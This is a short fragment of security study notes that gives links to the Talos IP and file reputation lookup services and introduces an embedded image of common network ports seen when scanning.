**Talos Reputation Center**

```
https://talosintelligence.com/reputation

https://talosintelligence.com/talos_file_reputation
```

### Common Ports

Below is a figure that lists most common network ports that you may encounter when conducting any scan. !\[\[ports-common.png]]
